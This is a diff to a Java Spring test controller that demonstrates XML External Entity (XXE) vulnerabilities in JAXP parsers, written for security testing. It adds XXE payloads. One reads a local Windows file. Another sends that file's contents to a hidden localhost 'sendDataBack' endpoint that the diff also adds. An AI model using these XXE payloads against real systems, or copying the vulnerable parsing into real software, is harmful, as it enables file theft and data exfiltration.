@@ -3,6 +3,7 @@ package cn.moonlord.test;
 import io.swagger.annotations.*;
 import org.springframework.web.bind.annotation.*;
 import org.w3c.dom.Document;
+import springfox.documentation.annotations.ApiIgnore;
 
 import javax.xml.XMLConstants;
 import javax.xml.parsers.*;
@@ -22,14 +23,16 @@ public class XXETestController {
                     "<!ENTITY xxe1 SYSTEM \"file:///C:/Windows/win.ini\" >" + "\r\n" +
                     "<!ENTITY http \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
                     "<!ENTITY xxe2 SYSTEM \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
-                    "<!ENTITY % param1 \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
-                    "<!ENTITY % param2 SYSTEM \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
+                    "<!ENTITY send \"http://localhost:8080/xxe/sendDataBack?data=&xxe1;\" >" + "\r\n" +
+                    "<!ENTITY xxe3 SYSTEM \"http://localhost:8080/xxe/sendDataBack?data=&xxe1;\" >" + "\r\n" +
             " ]>" + "\r\n" +
             "<example>" + "\r\n" +
                     "<file>&file;</file>" + "\r\n" +
-                    "<xxe>&xxe1;</xxe>" + "\r\n" +
+                    "<xxe1>&xxe1;</xxe1>" + "\r\n" +
                     "<http>&http;</http>" + "\r\n" +
-                    "<xxe>&xxe2;</xxe>" + "\r\n" +
+                    "<xxe2>&xxe2;</xxe2>" + "\r\n" +
+                    "<send>&send;</send>" + "\r\n" +
+                    "<xxe3>&xxe3;</xxe3>" + "\r\n" +
             "</example>";
 
     private static final String testCase2 =
@@ -65,6 +68,14 @@ public class XXETestController {
                 "javax.xml.transform.TransformerFactory",
                 "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl"
         );
+    }
+
+    @ApiIgnore
+    @GetMapping(value = "/sendDataBack")
+    public String sendDataBack(@RequestParam String data) {
+        data = "sendDataBack[length: " + data.length() +"]: " + "\r\n" + data;
+        System.err.println(data);
+        return data;
     }
 
     @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 1，使用默认的设置解析 XML，存在 XXE 漏洞")
